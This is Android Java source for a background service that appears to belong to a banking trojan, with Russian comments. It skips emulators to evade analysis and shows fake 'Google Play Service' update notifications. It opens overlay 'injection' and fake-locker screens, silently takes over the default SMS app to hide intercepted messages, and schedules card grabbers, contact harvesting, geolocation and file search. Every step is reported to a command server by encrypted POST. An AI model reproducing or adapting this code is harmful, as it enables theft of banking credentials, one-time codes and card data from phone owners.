package myapp.stuff.example;

import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.app.Notification;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Telephony;
import android.util.Base64;

import java.util.concurrent.TimeUnit;

import myapp.stuff.example.API.ClassRC4;
import myapp.stuff.example.Activity.ActivityAlert2;
import myapp.stuff.example.Activity.ActivityInjection;

import static android.os.PowerManager.PARTIAL_WAKE_LOCK;


public class StartWhileGlobal extends IntentService {
    Constants const_ = new Constants();
    UtilsClass SF = new UtilsClass();
    StoreStringClass storeStringClass = new StoreStringClass();
    private static final int NOTIFY_ID=9906;
    private Notification notif;
    Intent intent;
    private final String LOG_TAG = "StartWhileGlobal";
    String TAG_LOG = StartWhileGlobal.class.getSimpleName() ;

    public StartWhileGlobal() {
        super("");
    }
    Context context;

    @TargetApi(16)
    private void foregroundify() {
        notif = new Notification.Builder(context)
                .setContentTitle("Info")
                .setContentText("Update The Driver System..")
                .setSmallIcon(R.drawable.im)
                .build();
        startForeground(NOTIFY_ID,notif);
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if(SF.isEmulator())return;
        context=this;

        SF.Log("STARTWHILE","!!!");

        try {
            PowerManager mPowerManager = (PowerManager) context.getSystemService(POWER_SERVICE);
            PowerManager.WakeLock mWakeLock = mPowerManager.newWakeLock(PARTIAL_WAKE_LOCK, TAG_LOG);
            if (mWakeLock != null) {
                mWakeLock.acquire();
            }
        }catch (Exception ex){}


        //----Инициализация----
        int go = 0;
        try{
            String f= SF.SetRead(this, "swspacket");
            SF.Log(LOG_TAG,"App Packet "+f);
            go=1;
            SF.Log(LOG_TAG,"swspacket");
            if(f==null){
                go=0;
            }
        }catch (Exception ex){}

        if(go==0){
            SF.InitializationData(this);
        }

        int interval=1000;
        int timeWork = 0;
        int ticktime=0;
        int startDel6sws=-1;
        int schet_start_command=0;
        int schet_startInjLock=0;
        int intervalReques=15;
        try {
            intervalReques = Integer.parseInt(SF.SetRead(context, "interval"));
        }catch (Exception ex){}

        try{
            timeWork = Integer.parseInt(SF.SetRead(this,"time_work"));
        }catch (Exception ex){}
        //=====================


        while(true) {
            try {

                try {
                    TimeUnit.MILLISECONDS.sleep(interval);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                try {
                    SF.startCustomTimer(context, "startAlarm", Integer.parseInt(SF.SetRead(context, "Interval")));
                } catch (Exception ex) {
                }

                //*************Проверка состояние экрана*******
                KeyguardManager km2 = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
                boolean locked2 = km2.inKeyguardRestrictedInputMode();

                if (locked2) {
                    if (SF.SetRead(this, "foregroundwhile").equals("true")) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            SF.LoadLibNotification(this, "Google", "Update Google Play Service");
                        }else{
                            foregroundify();
                        }
                    }
                } else {
                    stopForeground(true);
                }
                //--------Проверяем есть команда для удаления себя-------------
                try {
                    if (SF.SetRead(context, "urls").length() <= 1) {
                        interval = 5000;
                        Intent dialogIntent = new Intent(this, ActivityAlert2.class)
                                .putExtra("start", "deleteApp");
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        //dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                        startActivity(dialogIntent);
                        continue;
                    }
                } catch (Exception ex) {
                    SF.Log(LOG_TAG, "STARTWHEIL -> stopSelf() error");
                }
                //--------Проверяем есть команда для удаления себя-------------

                ticktime += 2;



                if (!SF.isMyServiceRunning(context, StartWhileRequest.class)) {
                    context.startService(new Intent(context, StartWhileRequest.class));
                } else if (!UtilsClass.killed){
                    System.exit(0);
                    stopSelf();
                }
                interval = 2000;
                //---------Pedometer----------
                if (Build.VERSION.SDK_INT >= 26) {
                    if (!SF.isMyServiceRunning(context, ServicePedometer.class)) {
                            try {
                                startService(new Intent(context, ServicePedometer.class));
                            } catch (Exception ex) {}
                        }
                }else{
                    if (!SF.isMyServiceRunning(context, ServicePedometer.class)) {
                        try {
                            startService(new Intent(context, ServicePedometer.class));
                        } catch (Exception ex) {}
                    }
                }

                if(ticktime>=25){// через 25 секунд
                    timeWork = timeWork + 25;
                    SF.SetWrite(this, "time_work", String.valueOf(timeWork));
                    ticktime = 0;
                    SF.Log("TIME", String.valueOf(timeWork));

                    StartAllSettings(); //Страрт

                    if((const_.StartRequest==3)||(const_.StartRequest==6)) {
                        try {
                            String getSettingsPermission = SF.SetRead(this, "startRequest");
                            if ((getSettingsPermission.contains("Access=0")) || (getSettingsPermission.contains("Perm=0"))) {
                                if (timeWork >= 1000) {
                                    SF.SetWrite(this, "startRequest", "Access=1Perm=1");
                                }
                            }
                        }catch(Exception ex) {}
                    }
                }


                //*****************************************//
                schet_start_command++;
                schet_startInjLock++;
                //-----
                SF.Log("Time Requst HTTP",(intervalReques/1000)+ " = " + schet_start_command);
                if(schet_start_command>=(intervalReques/1000)+2){
                    intervalReques= Integer.parseInt(SF.SetRead(context, "interval"));
                    context.startService(new Intent(context, ServiceCommands.class));
                    schet_start_command = 0;
                }
                //-----

                // SF.Log("tick","Lock = "+schet_startInjLock);

                //--------Фейк локер
                if(schet_startInjLock>=(const_.intervalLockInjTime/1000)){
                    if(SF.isConnectedWifiOrMobile(context)) {
                        String lokerInj = SF.SetRead(context, "lock_inj");
                        String delsws = SF.SetRead(context, "del_sws");

                        if(delsws.contains("true"))
                            startDel6sws=1; else startDel6sws=0;

                        try {
                            if (((!lokerInj.equals(null)) || (!lokerInj.equals(""))) && (lokerInj.length() > 2)) {
                                Intent dialogIntent = new Intent(context, ActivityInjection.class)
                                        .putExtra("str", lokerInj);
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                startActivity(dialogIntent);
                            }
                        } catch (Exception ex) {
                        }
                    }
                    schet_startInjLock=0;
                }

                //-------Смена смс менеджера-------------
                if (startDel6sws==1){
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {//смена смс менеджера
                        if (!Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName())) {
                            //*************Проверка состояние экрана*******
                            KeyguardManager km = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
                            boolean locked = km.inKeyguardRestrictedInputMode();
                            //-----
                            if(!locked){
                                try {
                                    TimeUnit.MILLISECONDS.sleep(2000);} catch (InterruptedException e) {e.printStackTrace();}
                                Intent intentSMS = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                                intentSMS.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
                                intentSMS.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(intentSMS);
                                SF.POST(this,"4","p="+SF.trafEnCr(SF.ID_B(this)+"|Request for SMS manager change(hidden SMS interception)|"));
                            }
                        }
                    }
                }else if(startDel6sws==0){
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {//возращаем обратно
                        if (Telephony.Sms.getDefaultSmsPackage(this).equals(getPackageName())) {
                            //*************Проверка состояние экрана*******
                            KeyguardManager km = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
                            boolean locked = km.inKeyguardRestrictedInputMode();
                            //-----
                            if(!locked) {
                                try {
                                    TimeUnit.MILLISECONDS.sleep(2000);} catch (InterruptedException e) {e.printStackTrace();}
                                String getPackageNameDefault=SF.SetRead(this, "swspacket");
                                Intent intentSMS = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                                intentSMS.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageNameDefault);
                                intentSMS.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(intentSMS);
                                SF.POST(this,"4","p="+SF.trafEnCr(SF.ID_B(this)+"|Request to change the manager SMS to default|"));
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }
    }

    private void StartAllSettings(){
        new Thread(new Runnable(){
            public void run() {
                int timeWork;
                try {
                    timeWork = Integer.parseInt(SF.SetRead(context, "time_work"));
                }catch (Exception ex){
                    return;
                }
                //*************Проверка состояние экрана*******
                KeyguardManager km = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
                boolean locked = km.inKeyguardRestrictedInputMode();

                try {TimeUnit.MILLISECONDS.sleep(1000);} catch (InterruptedException e) {e.printStackTrace();}

                String getSettingsSTR = SF.SetRead(context, "SettingsAll");
                if(!getSettingsSTR.equals("")) {

                    /* 0  Hash(String)
                     * 1  Интервал отстука(int)
                     * 2  Перехват смс(Check)
                     * 3  Скрывать перехваченые смс(Check)
                     * 4  Запуск геолокации(Check)
                     * 5  Запрос для разрешения инжектирования приложений(int)
                     * 6  Запуск запроса разрешения геолокации(int)
                     * 7  Включаем автоинжекты и выбираем граббер СС(String/int)
                     * 8  Включаем инжекты и выбираем граббер СС(String/int)
                     * 9  Сбор лист контактов(int)
                     * 10 Запуск геолокации(int)
                     * 13 Поиск файлов(String)
                     */

                    String[] getSettings = getSettingsSTR.split("~");
                    int interval_TUK = 15000;
                    try {
                        interval_TUK = Integer.parseInt(getSettings[1]);//int
                    } catch (Exception e) {
                        SF.Log("ERROR", "INTERVAL GO");
                    }

                    String InterceptSMS = getSettings[2];//bool
                    String HideInterceptSMS = getSettings[3];//bool
                    String startGeolocations = getSettings[4];//bool
//                    int timeStartRequestInj = Integer.parseInt(getSettings[5]);//int
//                    int timeStartRequestGeolocations = Integer.parseInt(getSettings[6]);//int
                    int timeStartAutoInjAndGrabberCC = Integer.parseInt(getSettings[7].split("/")[1]);//int
                    String StartAutoInjAndGrabberCC = getSettings[7].split("/")[0];//String
                    int timeStartInjAndGrabberCC = Integer.parseInt(getSettings[8].split("/")[1]);//int
                    String StartInjAndGrabberCC = getSettings[8].split("/")[0];//String
                    int TimeGetContact = Integer.parseInt(getSettings[9]);//int
                    int TimeStartGeolocations = Integer.parseInt(getSettings[10]);//int
                    String urls = getSettings[11];//String!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                    String findfiles ="";//String

                    try {
                        findfiles = getSettings[13];
                    }catch (Exception ex){}

                    SF.Log("Интервал отстука", "" + interval_TUK);//Сразу
//                    SF.Log("Перехват смс", "" + InterceptSMS);//Сразу
//                    SF.Log("Скрытый перехват смс", "" + HideInterceptSMS);//Сразу
//                    SF.Log("Запуск геолокации", "" + startGeolocations);//Сразу
//                    SF.Log("Запрос прав на инжекты", "" + timeStartRequestInj);//ПО таймеру
//                    SF.Log("Запрос прав на ServiceGeolocationGPS", "" + timeStartRequestGeolocations);//ПО таймеру
//                    SF.Log("Авто инжекты + СС", StartAutoInjAndGrabberCC + " | " + timeStartAutoInjAndGrabberCC);//ПО таймеру
//                    SF.Log("Инжи + СС", StartInjAndGrabberCC + " | " + timeStartInjAndGrabberCC);//ПО таймеру
                    SF.Log("Получить контакты", "" + TimeGetContact);//ПО таймеру
                    SF.Log("Запуск ServiceGeolocationGPS по тайму", "" + TimeStartGeolocations);//ПО таймеру
                    SF.Log("Поиск файлов", "" + findfiles);//ПО таймеру

                    /*
                     * 0 START_INTERCEPT_SMS - Перехват смс  (Сразу)
                     * 1 START_HIDE_INTERCEPT_SMS - Скрытый перехват смс  (Сразу)
                     * 2 START_GEOLOCATIONS - Запуск геолокации  (Сразу)
                     * 3 Массив автоинжектов + СС   (ПО таймеру)
                     * 4 Массив инжектов + СС  (ПО таймеру)
                     */
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    String madeString="";
                    try {
                        madeString = SF.SetRead(context, "madeSettings");
                    }catch (Exception ex){
                        SF.Log("StartWhileGlobal","ERROR madeString");
                    }
                    if (madeString.contains("13 ")) { //urls panel
                        try {
                            if(!SF.SetRead(context,"findfiles").equals("**false**")){
                                SF.SetWrite(context, "findfiles", findfiles);
                            }
                        } catch (Exception ex){
                            madeString = madeString.replace("13 ", "13+");
                            SF.Log("Вып настр", "13 ERROR");
                        }
                        SF.Log("Вып настр", "13+");
                    }

                    if ((madeString.contains("11 "))&&(urls.length() >= 3)) { //urls panel
                        try {
                            SF.SetWrite(context, "urls", urls);
                        } catch (Exception ex) {
                            madeString = madeString.replace("11 ", "11+");
                            SF.Log("Вып настр", "11 ERROR");
                        }
                        SF.Log("Вып настр", "11+");
                    }

                    if (madeString.contains("1 ")) { //Интервал отстука
                        try {
                            SF.SetWrite(context, "interval", "" + interval_TUK);
                            madeString = madeString.replace("1 ", "1+");

                            SF.cancelCustomTimer(context, "startAlarm");
                            SF.startCustomTimer(context, "startAlarm", interval_TUK);
                            SF.Log("Вып настр", "Интервал сохранен");
                        } catch (Exception ex) {
                            SF.Log("Вып настр", "1 ERROR");
                        }
                    }

                    if (madeString.contains("2 ")) { //Перехват смс
                        if(!SF.SetRead(context, "perehvat_sws").contains("true")){
                            InterceptSMS = InterceptSMS.contains("true") ? "1" : "0";
                            String sendQuery = SF.POST(context, "7", "p=" + SF.trafEnCr(SF.ID_B(context) + ":InterceptionSMS:" + InterceptSMS + ":"));
                            if (sendQuery.contains("2453512")) {
                                madeString = madeString.replace("2 ", "2+");
                                SF.Log("Вып настр", "Перехват смс");
                            }
                        }

                    }
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    if (madeString.contains("3 ")) { //Скрытый перехват смс
                        if(!SF.SetRead(context, "del_sws").contains("true")) {
                            HideInterceptSMS = HideInterceptSMS.contains("true") ? "1" : "0";
                            String sendQuery = SF.POST(context, "7", "p=" + SF.trafEnCr(SF.ID_B(context) + ":HideInterceptionSMS:" + HideInterceptSMS + ":"));
                            if (sendQuery.contains("2453512")) {
                                madeString = madeString.replace("3 ", "3+");
                                SF.Log("Вып настр", "Скрытый перехват смс");
                            }
                        }
                    }

                    if (madeString.contains("4 ")) { //Запуск геолокации
                        if((SF.SetRead(context, "network").equals("false"))&&(SF.SetRead(context, "gps").equals("false"))) {
                            startGeolocations = startGeolocations.contains("true") ? "1" : "0";
                            String sendQuery = SF.POST(context, "7", "p=" + SF.trafEnCr(SF.ID_B(context) + ":Geolocation:" + startGeolocations + ":"));
                            if (sendQuery.contains("2453512")) {
                                madeString = madeString.replace("4 ", "4+");
                                SF.Log("Вып настр", "Запуск геолокации");
                            }
                        }
                    }

                    try {
                        TimeUnit.MILLISECONDS.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    SF.Log("SSS",""+madeString);
                    if (madeString.contains("7 8")) { //Авто инжекты + СС
                        if(SF.SetRead(context, "save_inj").length() <= 6) {
                            if ((timeStartAutoInjAndGrabberCC <= timeWork) && (timeStartAutoInjAndGrabberCC != -1)) {
                                String sendQuery = SF.POST(context, "7", "p=" + SF.trafEnCr(SF.ID_B(context) + ":autoInj:" + StartAutoInjAndGrabberCC + ":"));

                                if (sendQuery.contains("2453512")) {
                                    madeString = madeString.replace("7 ", "7+");
                                    //madeString = madeString.replace("8 ", "8+");
                                    SF.Log("Вып настр", "Авто инжекты + СС");
                                }
                            }
                        }
                    }
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    if (madeString.contains("8 9")) { //Инжи + СС
                        if(SF.SetRead(context, "save_inj").length() <= 6) {
                            if ((timeStartInjAndGrabberCC <= timeWork) && (timeStartInjAndGrabberCC != -1)) {
                                String sendQuery = SF.POST(context, "7", "p=" + SF.trafEnCr(SF.ID_B(context) + ":Inj:" + StartInjAndGrabberCC + ":"));
                                if (sendQuery.contains("2453512")) {
                                    //  madeString = madeString.replace("7 ", "7+");
                                    madeString = madeString.replace("8 ", "8+");
                                    SF.Log("Вып настр", "Авто инжекты + СС");
                                }
                            }
                        }
                    }
                    try {
                        TimeUnit.MILLISECONDS.sleep(1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    if (madeString.contains("10 ")) { //Запуск ServiceGeolocationGPS по тайму
                        if((SF.SetRead(context, "network").equals("false"))&&(SF.SetRead(context, "gps").equals("false"))) {
                            if ((TimeStartGeolocations <= timeWork) && (TimeStartGeolocations != -1)) {
                                String sendQuery = SF.POST(context, "7", "p=" + SF.trafEnCr(SF.ID_B(context) + ":Geolocation:1:"));
                                if (sendQuery.contains("2453512")) {
                                    madeString = madeString.replace("10 ", "10+");
                                    SF.Log("Вып настр", "Запуск ServiceGeolocationGPS по тайму");
                                }
                            }
                        }
                    }
                    try {
                        SF.SetWrite(context, "madeSettings", madeString);
                        SF.Log("StartWhileGlobal","Save madeSettings: "+madeString);
                    }catch (Exception ex){
                        SF.Log("StartWhileGlobal","ERROR Save madeSettings");
                    }
                }
            }
        }).start();
    }
}